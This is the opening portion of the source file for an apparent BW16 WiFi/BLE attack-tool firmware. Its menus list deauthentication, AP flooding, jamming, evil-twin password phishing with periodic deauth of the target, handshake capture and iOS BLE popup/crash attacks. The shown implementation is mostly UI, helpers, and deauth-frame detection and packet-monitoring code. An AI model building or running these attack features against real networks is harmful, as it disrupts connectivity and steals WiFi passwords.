/**
 * @file BW16-Tools.ino
 * @author FlyingIce
 * @brief BW16 WIFI Tools
 * @link https://github.com/FlyingIceyyds/BW16-Tools
 */

//引入魔改sdk
#include "SDK/WiFi.h"
#include "SDK/WiFiServer.h"
#include "SDK/WiFiClient.h"
#include "SDK/WiFi.cpp"
#include "SDK/WiFiClient.cpp"
#include "SDK/WiFiServer.cpp"
#include "SDK/WiFiSSLClient.cpp"
#include "SDK/WiFiUdp.cpp"

#include "wifi_conf.h"
#include "wifi_cust_tx.h"
void LinkJammer();
#include "wifi_util.h"
#include "wifi_structures.h"

#undef max
#undef min
#undef rand
#include <vector>
#include <set>
#include <utility>
#include "debug.h"
#include <Wire.h>
#include <algorithm>

// 引入web页面
#include "WebPages/web_admin.h"
#include "WebPages/web_auth1.h"
#include "WebPages/web_auth2.h"
#include "web_config.h"
// Handshake capture module
#include "handshake.h"

// Fallback for FPSTR on cores that don't define it
#ifndef FPSTR
class __FlashStringHelper; // forward declaration for Arduino-style flash string helper
#define FPSTR(p) (reinterpret_cast<const __FlashStringHelper *>(p))
#endif

// 引入DNSServer
#include "DNSServer.h"

// Display
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <U8g2_for_Adafruit_GFX.h>
// BLE support (used only in BLE submenu actions)
#include "BLEDevice.h"
extern "C" {
#include "gap_le.h"
#include "gap_adv.h"
}
U8G2_FOR_ADAFRUIT_GFX u8g2_for_adafruit_gfx;
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
// Face standby includes
#include "face/Common.h"
#include "face/Face.h"
#include "face/FaceEmotions.hpp"
// Force-include face sources so Arduino builder links them
#include "face/AsyncTimer.cpp"
#include "face/Eye.cpp"
#include "face/EyeBlink.cpp"
#include "face/EyeTransformation.cpp"
#include "face/EyeTransition.cpp"
#include "face/EyeVariation.cpp"
#include "face/BlinkAssistant.cpp"
#include "face/LookAssistant.cpp"
#include "face/FaceExpression.cpp"
#include "face/FaceBehavior.cpp"
#include "face/Face.cpp"

// Provide adapter instance for face module
U8g2Adapter u8g2;

// Standby face state
static bool g_standbyFaceActive = false;
static Face* g_face = nullptr;
static unsigned long g_faceLastRandomizeMs = 0;
static const unsigned long FACE_RANDOMIZE_INTERVAL_MS = 4000;

const int UI_RIGHT_GUTTER = 10; // 右侧预留滚动条与箭头区域（加宽以留出更协调的间距）
// 控制在通用基础绘制中是否强制显示占位滚动条（用于BLE动画避免闪烁）
static bool g_forceScrollbarAlwaysForGeneric = false;
// 动画配置（优化启动速度）
const int ANIM_STEPS = 6;       // 动画步数（更顺滑）
const int ANIM_DELAY_MS = 0;    // 通用每步延时（非选择框移动场景）
// 统一选择框移动总时长（毫秒）：略慢于当前首页，略快于SSID页
const int SELECT_MOVE_TOTAL_MS = 60;
// 动画刷帧频率控制：每隔多少帧调用一次 display.display（减少刷新次数）
const int DISPLAY_FLUSH_EVERY_FRAMES = 2;
// 启动动画（更短）
const int TITLE_FRAMES = 20;     // 增加闪烁次数（启动仍保持<1s）
const int TITLE_DELAY_MS = 25;   // 每帧延时
// 控制选择动画是否跳过（用于翻页时避免重复播放）
static bool g_skipNextSelectAnim = false;

// 按键引脚定义
#define BTN_DOWN PA12
#define BTN_UP PA27
#define BTN_OK PA13
#define BTN_BACK PB2

// LED引脚定义（BW16开发板）
#ifndef LED_R
#define LED_R AMB_D12  // Red LED
#endif
#ifndef LED_G
#define LED_G AMB_D10  // Green LED
#endif
#ifndef LED_B
#define LED_B AMB_D11  // Blue LED
#endif

// ===== Web Test Forward Declarations =====
bool startWebTest();
void stopWebTest();
void handleWebTest();
void drawWebTestMain();
void drawWebTestInfo();
void drawWebTestPasswords();
void drawWebTestStatus();
void handleWebTestClient(WiFiClient& client);
void sendWebTestPage(WiFiClient& client);

// ===== UI Modal Forward Declaration =====
void showModalMessage(const String& line1, const String& line2 = String(""));
bool showConfirmModal(const String& line1,
                      const String& leftHint = String("《 取消"),
                      const String& rightHint = String("确认 》"));

// ===== Home Menu: unified registry and actions =====
typedef void (*HomeAction)();
struct HomeMenuItem {
  const char* label;
  HomeAction action;
};

// Forward declarations for BLE actions and menus
void bleHeadsetTest();
void blePopupMenu();
void blePopupStart_iOS();
void blePopupStart_iOSActionModal();
void blePopupStart_iOS17Crash();
void blePlaceholderPage();
void homeActionBleTest();
void homeActionBlePopupTest();

// Forward declarations for home actions (handlers)
void homeActionSelectSSID();
void homeActionAttackMenu();
void homeActionQuickScan();
void homeActionPhishing();
void homeActionConnInterfere();
void homeActionApFlood();
void homeActionAttackDetect();
void homeActionPacketMonitor();
void homeActionDeepScan();
void homeActionWebUI();

// Root menu enter actions
void rootActionEnterWifi();
void rootActionEnterBle();

// VARIABLES
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];

  short rssi;
  uint channel;
  int security_type;
} WiFiScanResult;

// ===== Handshake WebUI State =====
extern bool hs_sniffer_running;
static WiFiScanResult hs_selected_network = {};
static bool hs_has_selection = false;

// SelectedAP defined in handshake.h
SelectedAP _selectedNetwork;

// Provide AP_Channel compatible getter used by handshake.h
String AP_Channel = String(0);

static __attribute__((unused)) String bytesToStr(const uint8_t* mac, int len) {
  char buf[3*6];
  int n = 0; for (int i=0;i<len;i++){ n += snprintf(buf+n, sizeof(buf)-n, i==len-1?"%02X":"%02X:", mac[i]); }
  return String(buf);
}

// Credentials for you Wifi network
char *ssid = "";
char *pass = "";
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
// 信标攻击频段选择：0=综合, 1=5G, 2=2.4G
int beaconBandMode = 0;

// ===== URL/HTTP helpers =====
// 解码 application/x-www-form-urlencoded 的百分号编码（UTF-8字节级解码）
/**
 * @brief Decode percent-encoded application/x-www-form-urlencoded text.
 *
 * Replaces '+' with space and decodes %HH sequences as raw UTF-8 bytes.
 * Invalid sequences are preserved as-is.
 *
 * @param input Input string to decode.
 * @return Decoded string.
 */
static String urlDecode(const String& input) {
  String out;
  out.reserve(input.length());
  for (size_t i = 0; i < (size_t)input.length(); i++) {
    char c = input[(int)i];
    if (c == '+') {
      out += ' ';
    } else if (c == '%' && i + 2 < (size_t)input.length()) {
      char h1 = input[(int)i + 1];
      char h2 = input[(int)i + 2];
      auto hexVal = [](char ch) -> int {
        if (ch >= '0' && ch <= '9') return ch - '0';
        if (ch >= 'A' && ch <= 'F') return ch - 'A' + 10;
        if (ch >= 'a' && ch <= 'f') return ch - 'a' + 10;
        return -1;
      };
      int v1 = hexVal(h1);
      int v2 = hexVal(h2);
      if (v1 >= 0 && v2 >= 0) {
        char decoded = (char)((v1 << 4) | v2);
        out += decoded;
        i += 2;
      } else {
        // 非法编码，按原样保留
        out += c;
      }
    } else {
      out += c;
    }
  }
  return out;
}

// 将UTF-8字符串按字节安全截断到不超过maxBytes（不截断在多字节中间）
/**
 * @brief Truncate a UTF-8 string by byte length without splitting multibyte chars.
 *
 * @param input Source UTF-8 string.
 * @param maxBytes Maximum number of bytes allowed in the result.
 * @return Truncated string not exceeding maxBytes.
 */
static String utf8TruncateByBytes(const String& input, int maxBytes) {
  if (maxBytes <= 0) return String("");
  const char* s = input.c_str();
  int len = (int)strlen(s);
  if (len <= maxBytes) return input;
  int bytes = 0;
  int lastSafe = 0;
  for (int i = 0; i < len; ) {
    unsigned char c = (unsigned char)s[i];
    int charLen = 1;
    if ((c & 0x80) == 0x00) {
      charLen = 1; // 0xxxxxxx
    } else if ((c & 0xE0) == 0xC0) {
      charLen = 2; // 110xxxxx
    } else if ((c & 0xF0) == 0xE0) {
      charLen = 3; // 1110xxxx
    } else if ((c & 0xF8) == 0xF0) {
      charLen = 4; // 11110xxx
    } else {
      // 非法前缀，按单字节处理，避免死循环
      charLen = 1;
    }
    if (bytes + charLen > maxBytes) break;
    bytes += charLen;
    lastSafe = i + charLen;
    i += charLen;
  }
  String out;
  out.reserve(bytes);
  for (int i = 0; i < lastSafe; i++) out += s[i];
  return out;
}

static inline bool is24GChannel(int ch) {
  return ch >= 1 && ch <= 14;
}

static inline bool is5GChannel(int ch) {
  return ch >= 36; // 简化判断：常见5G信道在36及以上
}

bool BeaconBandMenu();
void StableBeacon();
int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::vector<int> SelectedVector;
// 选择状态标记：与 scan_results 一一对应，0 未选中 / 1 选中（用于 O(1) 查询）
std::vector<uint8_t> selectedFlags;
// 未使用，移除多余的运行状态标志
// bool deauth_running = false;
// deauth_bssid 不再需要临时缓冲，直接传指针更高效
uint8_t becaon_bssid[6];
// 移除未使用的SSID展示变量
// String SelectedSSID;
// String SSIDCh;
// 全局未使用（各处使用局部常量），移除
// unsigned long SCROLL_DELAY = 300; // 滚动延迟时间
int attackstate = 0;
int menustate = 0;
int deauthstate = 0; 
int scrollindex = 0;
int perdeauth = 3;
int num = 0; // 添加全局变量声明

// Menu mode
enum MenuMode { MENU_ROOT = 0, MENU_WIFI = 1, MENU_BLE = 2 };
static MenuMode g_menuMode = MENU_ROOT;

// Root menu state
static int rootStartIndex = 0;
static int rootState = 0;

// BLE submenu state
static int bleStartIndex = 0;
static int bleState = 0;

// WiFi submenu (existing home) state
int homeStartIndex = 0;
int homeState = 0; // 初始化为0，对应第一项

// Root menu (top-level)
static const HomeMenuItem g_rootMenuItems[] = {
  {"WIFI の 功能", rootActionEnterWifi},
  {"BLE の 功能",  rootActionEnterBle}
};
static const int g_rootMenuCount = (int)(sizeof(g_rootMenuItems) / sizeof(g_rootMenuItems[0]));

// BLE submenu (three options)
static const HomeMenuItem g_bleMenuItems[] = {
  {"蓝牙信标广播", homeActionBleTest},
  {"蓝牙弹窗攻击", homeActionBlePopupTest},
  {"README.md", blePlaceholderPage}
};
static const int g_bleMenuCount = (int)(sizeof(g_bleMenuItems) / sizeof(g_bleMenuItems[0]));

// Unified registry: add new items here only (WiFi submenu)
static const HomeMenuItem g_homeMenuItems[] = {
  {"选择AP/SSID",            homeActionSelectSSID},
  {"常规攻击[Attack]",       homeActionAttackMenu},
  {"快速扫描[Scan]",         homeActionQuickScan},
  {"密码钓鱼[Phishing]",     homeActionPhishing},
  {"连接/信道干扰[CI]",      homeActionConnInterfere},
  {"AP洪水攻击[Dos]",        homeActionApFlood},
  {"攻击帧检测[Detect]",     homeActionAttackDetect},
  {"监视器[Monitor]",        homeActionPacketMonitor},
  {"深度扫描 DeepScan",      homeActionDeepScan},
  {"启动[Web UI]",           homeActionWebUI}
};
static const int g_homeMenuCount = (int)(sizeof(g_homeMenuItems) / sizeof(g_homeMenuItems[0]));
static inline int getHomeMaxItems() { return g_homeMenuCount; }
#define HOME_MAX_ITEMS (getHomeMaxItems())

const int HOME_PAGE_SIZE = 3;
const int HOME_ITEM_HEIGHT = 20; // 增加行高以占满屏幕高度
const int HOME_Y_OFFSET = 2;
const int HOME_RECT_HEIGHT = 18; // 增加矩形高度

// Web UI相关变量
bool web_ui_active = false;
bool web_test_active = false;
bool web_server_active = false;
bool dns_server_active = false;
// Handshake sniffer running flag (used by WebUI and handshake.h)
bool hs_sniffer_running = false;

// 钓鱼模式一次性锁：关闭后禁止再次启动，需重启设备
bool g_webTestLocked = false;
// WebUI一次性锁：启动过后禁止启动AP模式，需重启设备
bool g_webUILocked = false;
//作用：防止部分资源无法释放导致DNSServer启动异常，强制门户不生效

DNSServer dnsServer;
WiFiServer web_server(WEB_SERVER_PORT);
WiFiClient web_client;
unsigned long last_web_check = 0;
const unsigned long WEB_CHECK_INTERVAL = 100; // Web客户端检查间隔

// Web Test 动态配置（根据所选SSID设置）
String web_test_ssid_dynamic = WEB_TEST_SSID;
int web_test_channel_dynamic = WEB_TEST_CHANNEL;
// Web Test 提交文本日志
std::vector<String> web_test_submitted_texts;
static int webtest_password_scroll = 0;
static int webtest_password_cursor = 0;
// Web Test OLED 页面状态：0=主页面，1=接入点信息，2=密码列表，3=运行状态
static int webtest_ui_page = 0;
// 最近一次接收到密码的时间戳，用于主页高亮显示一秒
static bool webtest_border_always_on = false;
static int webtest_flash_remaining_toggles = 0; // 4 toggles = 闪烁两下
static unsigned long webtest_last_flash_toggle_ms = 0;
static bool webtest_border_flash_visible = true;
	// 钓鱼模式：目标BSSID与定期Deauth控制
	static bool phishingHasTarget = false;
	static uint8_t phishingTargetBSSID[6] = {0};
	static unsigned long lastPhishingDeauthMs = 0;
	static unsigned long lastPhishingBroadcastMs = 0;

// 攻击检测边框效果变量
static bool detect_border_always_on = false;
static int detect_flash_remaining_toggles = 0; // 4 toggles = 闪烁两下
static unsigned long detect_last_flash_toggle_ms = 0;
static bool detect_border_flash_visible = true;

// ============ 攻击检测（解除认证/断开关联帧侦测） ============
#if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
extern "C" {
#include "wifi_conf.h"
}
#endif
static volatile unsigned long g_detectDeauthCount = 0;
static volatile unsigned long g_detectDisassocCount = 0;
static bool g_attackDetectRunning = false;
static unsigned long g_attackDetectLastDrawMs = 0;
static unsigned long g_attackDetectLastChSwitchMs = 0;
static int g_attackDetectChIndex = 0; // 遍历当前信道组
static uint8_t g_localMacForDetect[6] = {0};
static volatile uint8_t g_lastDetectSrc[6] = {0};
static volatile uint8_t g_lastDetectKind = 0; // 0xC0 deauth, 0xA0 disassoc
static unsigned long g_lastDetectLogMs = 0;
static volatile uint16_t g_lastReason = 0;

// 数据包侦测相关变量
static bool g_packetDetectRunning = false;
static unsigned long g_packetDetectLastDrawMs = 0;
static volatile unsigned long g_packetCount = 0; // 数据包计数
static unsigned long g_packetCountLastReset = 0; // 上次重置计数的时间
static int g_packetDetectChannel = 1; // 当前监听的信道
static unsigned long g_packetDetectStartTime = 0; // 开始侦测的时间
static unsigned long g_packetDetectLastChannelSwitch = 0; // 上次切换信道的时间
static volatile unsigned long g_packetDetectTotalPackets = 0; // 总数据包数
static unsigned long g_packetDetectHistory[64] = {0}; // 历史数据包数量（用于图表）
static int g_packetDetectHistoryIndex = 0; // 历史数据索引

// 数据包侦测页面UI状态变量
static bool g_showDownIndicator = false; // 显示下键指示器
static bool g_showUpIndicator = false;   // 显示上键指示器

// 管理帧检测指示器
static bool g_showMgmtFrameIndicator = false; // 显示管理帧指示器
static unsigned long g_mgmtFrameIndicatorStartTime = 0; // 管理帧指示器开始时间
static const unsigned long MGMT_FRAME_INDICATOR_TIME = 1000; // 管理帧指示器显示时间（毫秒）

// 2.4G和5G信道列表
static const int channels24G[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
static const int channels5G[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
static const int channels24GCount = sizeof(channels24G) / sizeof(channels24G[0]);
static const int channels5GCount = sizeof(channels5G) / sizeof(channels5G[0]);

// 当前使用的信道列表索引
static int g_currentChannelListIndex = 0;
static bool g_using24G = true; // true=2.4G, false=5G

// 按键状态检测变量
static bool g_upKeyPressed = false;
static bool g_downKeyPressed = false;
static unsigned long g_upKeyPressTime = 0;
static unsigned long g_downKeyPressTime = 0;
static const unsigned long KEY_DEBOUNCE_MS = 50; // 按键防抖时间

// 信道预览相关变量
static bool g_channelPreviewMode = false;
static int g_previewChannel = 1;
static bool g_usingPreview24G = true;
static int g_previewChannelListIndex = 0;
static unsigned long g_lastPreviewSwitchTime = 0; // 上次预览切换的时间
static bool g_previewSwitchPending = false; // 防止重复切换的标志

// 信道组定义
enum ChannelGroupType {
  CHANNEL_GROUP_24G_5G_COMMON = 0,  // 2.4G+5G常用信道（默认）
  CHANNEL_GROUP_24G_ALL = 1,        // 2.4G全部信道
  CHANNEL_GROUP_5G_ALL = 2,         // 5G全部信道
  CHANNEL_GROUP_24G_5G_ALL = 3,     // 2.4G+5G全部信道
  CHANNEL_GROUP_COUNT
};

static int g_currentChannelGroup = CHANNEL_GROUP_24G_5G_COMMON; // 当前信道组

// 2.4G全部信道
static const uint8_t detectChannels24GAll[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14};

// 5G全部信道
static const uint8_t detectChannels5GAll[] = {36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165};

// 2.4G+5G常用信道（默认）
static const uint8_t detectChannels24G5GCommon[] = {1,6,11,3,8,13,36,40,44,48,149,153,157,161,165};

// 2.4G+5G全部信道
static const uint8_t detectChannels24G5GAll[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165};

// 获取当前信道组的信道数组和数量
static const uint8_t* getCurrentChannelGroup(int& count) {
  switch (g_currentChannelGroup) {
    case CHANNEL_GROUP_24G_ALL:
      count = sizeof(detectChannels24GAll) / sizeof(detectChannels24GAll[0]);
      return detectChannels24GAll;
    case CHANNEL_GROUP_5G_ALL:
      count = sizeof(detectChannels5GAll) / sizeof(detectChannels5GAll[0]);
      return detectChannels5GAll;
    case CHANNEL_GROUP_24G_5G_COMMON:
      count = sizeof(detectChannels24G5GCommon) / sizeof(detectChannels24G5GCommon[0]);
      return detectChannels24G5GCommon;
    case CHANNEL_GROUP_24G_5G_ALL:
      count = sizeof(detectChannels24G5GAll) / sizeof(detectChannels24G5GAll[0]);
      return detectChannels24G5GAll;
    default:
      count = sizeof(detectChannels24G5GCommon) / sizeof(detectChannels24G5GCommon[0]);
      return detectChannels24G5GCommon;
  }
}

// 获取当前信道组名称
static String getCurrentChannelGroupName() {
  switch (g_currentChannelGroup) {
    case CHANNEL_GROUP_24G_ALL:
      return "2.4G全部信道";
    case CHANNEL_GROUP_5G_ALL:
      return "5G全部信道";
    case CHANNEL_GROUP_24G_5G_COMMON:
      return "2.4G+5G常用信道";
    case CHANNEL_GROUP_24G_5G_ALL:
      return "2.4G+5G全部信道";
    default:
      return "2.4G+5G常用信道";
  }
}

// 获取当前信道组简称
static String getCurrentChannelGroupShortName() {
  switch (g_currentChannelGroup) {
    case CHANNEL_GROUP_24G_ALL:
      return "2.4G";
    case CHANNEL_GROUP_5G_ALL:
      return "5G";
    case CHANNEL_GROUP_24G_5G_COMMON:
      return "常用";
    case CHANNEL_GROUP_24G_5G_ALL:
      return "全部";
    default:
      return "常用";
  }
}

// 切换到下一个信道组
static void switchToNextChannelGroup() {
  g_currentChannelGroup = (g_currentChannelGroup + 1) % CHANNEL_GROUP_COUNT;
  g_attackDetectChIndex = 0; // 重置信道索引
  
  // 获取新信道组的第一个信道
  int count;
  const uint8_t* channels = getCurrentChannelGroup(count);
  if (count > 0) {
    wext_set_channel(WLAN0_NAME, channels[0]);
    Serial.print("[Detect] Switched to channel group: "); 
    Serial.print(getCurrentChannelGroupName());
    Serial.print(" (first channel: "); Serial.print(channels[0]); Serial.println(")");
  }
}

// BW16/RTL8720DN: 2.4GHz 常用检测信道（保留兼容性）
static const uint8_t detectChannels24G[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
static volatile unsigned long g_promiscCbHits = 0;
static volatile unsigned long g_mgmtFramesSeen = 0;
static volatile uint32_t g_subtypeHistogram[16] = {0};
static unsigned long g_detectStickyUntilMs = 0; // 发现攻击帧后粘滞停留在当前信道
// 事件缓冲区：回调→主循环
struct DetectEvent { uint8_t mac[6]; uint8_t kind; unsigned long ts; };
static volatile unsigned int g_evHead = 0, g_evTail = 0;
static DetectEvent g_evBuf[64];
// 可疑记录
struct SuspectRecord {
  uint8_t bssid[6];
  unsigned long deauthCount;
  unsigned long disassocCount;
  unsigned long lastSeenMs;
};
static std::vector<SuspectRecord> g_suspects;
static unsigned long g_totalDeauth = 0;
static unsigned long g_totalDisassoc = 0;
// UI 状态
static int g_detectUiMode = 0; // 0=主页,1=记录列表,2=统计页
static int g_recordsPage = 0;
// 驻留窗口内临时计数（用于触发"可疑记录"）
struct TempCount { uint8_t bssid[6]; unsigned int d; unsigned int a; };
static std::vector<TempCount> g_tempCounts;

#if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
extern "C" {
  int wifi_set_mgnt_rxfilter(uint8_t enable);
  typedef struct { uint8_t filter_mode; } promisc_filter_t;
  #ifndef PROMISC_FILTER_MASK_MGMT
  #define PROMISC_FILTER_MASK_MGMT 0x01
  #endif
  int wifi_set_promisc_filter(promisc_filter_t *f);
  int wifi_set_promisc_filter_reason(uint8_t enable);
}
#endif

// 混杂模式：AmebaD 使用 wifi_set_promisc(RTW_PROMISC_ENABLE/DISABLE,...)

// 解析简单802.11管理帧，统计Deauth/Disassoc
static void promiscDetectCallback(unsigned char *buf, unsigned int len, void *userdata) {
  (void)userdata;
  if (!buf || len < 24) {
    // 增加调试信息：记录短帧
    static unsigned long lastShortFrameLog = 0;
    if (millis() - lastShortFrameLog > 5000) {
      Serial.print("[Detect] Short frame received: len="); Serial.println(len);
      lastShortFrameLog = millis();
    }
    return;
  }
  
  g_promiscCbHits++;
  
  // 增加调试信息：记录所有接收到的帧
  static unsigned long lastFrameLog = 0;
  if (millis() - lastFrameLog > 10000) {
    Serial.print("[Detect] Frame received: len="); Serial.print(len);
    Serial.print(" buf[0]="); Serial.print(buf[0], HEX);
    Serial.print(" buf[1]="); Serial.println(buf[1], HEX);
    lastFrameLog = millis();
  }
  
  // 兼容多种SDK头偏移：0,4,8,24,32,36,40（实测不同固件可能前置头大小不同）
  const int tryOffsets[] = {0, 4, 8, 24, 32, 36, 40};
  for (size_t t = 0; t < sizeof(tryOffsets)/sizeof(tryOffsets[0]); t++) {
    int off = tryOffsets[t];
    if (len < (unsigned)(off + 24)) continue;
    const uint8_t *base = buf + off;
    uint16_t fc = (uint16_t)base[0] | ((uint16_t)base[1] << 8);
    uint8_t type = (fc >> 2) & 0x3;
    uint8_t subtype = (fc >> 4) & 0xF;
    
    // 记录所有管理帧类型
    if (type == 0) {
      g_mgmtFramesSeen++;
      if (subtype < 16) g_subtypeHistogram[subtype]++;
      
      // 增加调试信息：记录管理帧
      static unsigned long lastMgmtLog = 0;
      if (millis() - lastMgmtLog > 5000) {
        Serial.print("[Detect] Management frame: type="); Serial.print(type);
        Serial.print(" subtype="); Serial.print(subtype);
        Serial.print(" fc=0x"); Serial.println(fc, HEX);
        lastMgmtLog = millis();
      }
    }
    
    if (type != 0) continue; // 仅统计管理帧
    bool isDeauth = (subtype == 12);
    bool isDisassoc = (subtype == 10);
    if (!isDeauth && !isDisassoc) continue;
    
    const uint8_t *src = base + 10; // 地址2
    bool fromSelf = true;
    for (int i = 0; i < 6; i++) { if (src[i] != g_localMacForDetect[i]) { fromSelf = false; break; } }
    if (fromSelf) return; // 忽略本机
    
    // 记录攻击帧检测
    Serial.print("[Detect] Attack frame detected: ");
    Serial.print(isDeauth ? "Deauth" : "Disassoc");
    Serial.print(" from ");
    for (int i = 0; i < 6; i++) { Serial.print(src[i], HEX); if (i<5) Serial.print(":"); }
    Serial.println();
    
    // 设置管理帧指示器（攻击检测）
    g_showMgmtFrameIndicator = true;
    g_mgmtFrameIndicatorStartTime = millis();
    
    // 入队事件
    unsigned int nh = (g_evHead + 1) & 63;
    if (nh != g_evTail) {
      for (int i = 0; i < 6; i++) g_evBuf[g_evHead].mac[i] = src[i];
      g_evBuf[g_evHead].kind = isDeauth ? 0xC0 : 0xA0;
      g_evBuf[g_evHead].ts = millis();
      g_evHead = nh;
    }
    // 临时计数用于触发"可疑记录"
    int tIdx = -1; for (size_t j = 0; j < g_tempCounts.size(); j++) { bool eq=true; for(int k=0;k<6;k++) if (g_tempCounts[j].bssid[k]!=src[k]) {eq=false;break;} if(eq){tIdx=(int)j;break;} }
    if (tIdx == -1) { TempCount tc; memcpy(tc.bssid, src, 6); tc.d = isDeauth?1:0; tc.a = isDisassoc?1:0; g_tempCounts.push_back(tc); }
    else { if (isDeauth) g_tempCounts[tIdx].d++; if (isDisassoc) g_tempCounts[tIdx].a++; }
    // 保留最近一次用于OLED角落显示
    if (isDeauth) { g_lastDetectKind = 0xC0; } else { g_lastDetectKind = 0xA0; }
    for (int i = 0; i < 6; i++) g_lastDetectSrc[i] = src[i];
    if (len >= (unsigned)(off + 26)) { uint16_t r; memcpy(&r, base + 24, sizeof(r)); g_lastReason = r; }
    // 攻击帧命中后，在当前信道粘滞 3 秒，利于累积统计
    g_detectStickyUntilMs = millis() + 3000;
    return;
  }
}

// 数据包侦测回调函数：统计所有接收到的数据包
static void promiscPacketDetectCallback(unsigned char *buf, unsigned int len, void *userdata) {
  (void)userdata;
  if (!buf || len < 10) { // 降低最小长度要求，捕获更多数据包
    return;
  }
  
  // 增加数据包计数（统计所有可识别的数据包）
  g_packetCount++;
  g_packetDetectTotalPackets++;
  
  // 检测解除认证帧和解除关联帧（参考攻击检测功能的实现）
  if (len >= 24) {
    // 兼容多种SDK头偏移：0,4,8,24,32,36,40（实测不同固件可能前置头大小不同）
    const int tryOffsets[] = {0, 4, 8, 24, 32, 36, 40};
    for (size_t t = 0; t < sizeof(tryOffsets)/sizeof(tryOffsets[0]); t++) {
      int off = tryOffsets[t];
      if (len < (unsigned)(off + 24)) continue;
      const uint8_t *base = buf + off;
      uint16_t fc = (uint16_t)base[0] | ((uint16_t)base[1] << 8);
      uint8_t type = (fc >> 2) & 0x3;
      uint8_t subtype = (fc >> 4) & 0xF;
      
      // 只检测解除认证帧（subtype=12）和解除关联帧（subtype=10）
      if (type == 0) { // 管理帧
        bool isDeauth = (subtype == 12);
        bool isDisassoc = (subtype == 10);
        if (isDeauth || isDisassoc) {
          // 设置管理帧指示器
          g_showMgmtFrameIndicator = true;
          g_mgmtFrameIndicatorStartTime = millis();
          Serial.print("[PacketDetect] Attack frame detected: ");
          Serial.print(isDeauth ? "Deauth" : "Disassoc");
          Serial.print(" subtype="); Serial.println(subtype);
          break; // 找到目标帧后退出循环
        }
      }
    }
  }
}

// 前向声明，实际实现在BLE变量声明之后
static void checkBleResourcesForWiFi();

// 启动数据包侦测
static void startPacketDetection() {
  Serial.println("启动数据包监视器...");
  
  g_packetCount = 0;
  g_packetDetectTotalPackets = 0;
  g_packetDetectRunning = true;
  g_packetDetectStartTime = millis();
  g_packetDetectLastChannelSwitch = millis();
  g_packetCountLastReset = millis();
  
  // 初始化信道列表索引
  g_currentChannelListIndex = 0;
  g_using24G = true;
  g_packetDetectChannel = channels24G[0]; // 从2.4G信道1开始
  
  // 清空历史数据
  for (int i = 0; i < 64; i++) {
    g_packetDetectHistory[i] = 0;
  }
  g_packetDetectHistoryIndex = 0;
  
  Serial.println("[PacketDetect] Starting packet detection...");
  Serial.print("[PacketDetect] Initial channel: "); Serial.println(g_packetDetectChannel);
  
  // 设置初始信道
  wext_set_channel(WLAN0_NAME, g_packetDetectChannel);
  
  // 关闭省电模式
  WiFi.disablePowerSave();
  
  #if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
  {
    // 不设置过滤器，监测所有类型的数据包
    Serial.println("[PacketDetect] No filter set - monitoring all packet types");
    
    int rcR = wifi_set_promisc_filter_reason(0); // 禁用原因码过滤
    Serial.print("[PacketDetect] wifi_set_promisc_filter_reason(0) rc="); Serial.println(rcR);
    
    int rc = wifi_set_mgnt_rxfilter(0); // 禁用管理帧过滤
    Serial.print("[PacketDetect] wifi_set_mgnt_rxfilter(0) rc="); Serial.println(rc);
  }
  #endif
  
  // 启用混杂模式
  int rc = wifi_set_promisc(RTW_PROMISC_ENABLE_2, promiscPacketDetectCallback, 1);
  Serial.print("[PacketDetect] wifi_set_promisc(RTW_PROMISC_ENABLE_2, len=1) rc="); Serial.println(rc);
  
  if (rc != 0) {
    Serial.println("[PacketDetect] RTW_PROMISC_ENABLE_2 failed, trying RTW_PROMISC_ENABLE");
    rc = wifi_set_promisc(RTW_PROMISC_ENABLE, promiscPacketDetectCallback, 1);
    Serial.print("[PacketDetect] wifi_set_promisc(RTW_PROMISC_ENABLE, len=1) rc="); Serial.println(rc);
  }
}

// 停止数据包侦测
static void stopPacketDetection() {
  Serial.println("[PacketDetect] Stopping packet detection...");
  
  // 关闭混杂模式
  #if defined(RTW_PROMISC_DISABLE)
  {
    int rc = wifi_set_promisc(RTW_PROMISC_DISABLE, nullptr, 0);
    Serial.print("[PacketDetect] wifi_set_promisc(DISABLE) rc="); Serial.println(rc);
  }
  #endif
  
  // 恢复省电模式
  #if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
  {
    int rc = wifi_set_mgnt_rxfilter(0);
    Serial.print("[PacketDetect] wifi_set_mgnt_rxfilter(0) rc="); Serial.println(rc);
  }
  #endif
  
  // 重置状态变量
  g_packetDetectRunning = false;
  g_packetDetectLastDrawMs = 0;
  g_packetDetectLastChannelSwitch = 0;
  g_packetCount = 0;
  g_packetDetectTotalPackets = 0;
  
  // 重置按键状态
  g_upKeyPressed = false;
  g_downKeyPressed = false;
  g_upKeyPressTime = 0;
  g_downKeyPressTime = 0;
  
  // 重置预览状态
  g_channelPreviewMode = false;
  g_previewChannel = 1;
  g_usingPreview24G = true;
  g_previewChannelListIndex = 0;
  g_lastPreviewSwitchTime = 0;
  g_previewSwitchPending = false;
  
  // 恢复默认字体设置以支持中文显示
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  Serial.println("[PacketDetect] Packet detection stopped and resources cleaned up");
}

// 切换到下一个信道
static void switchToNextPacketDetectChannel() {
  if (g_using24G) {
    g_currentChannelListIndex++;
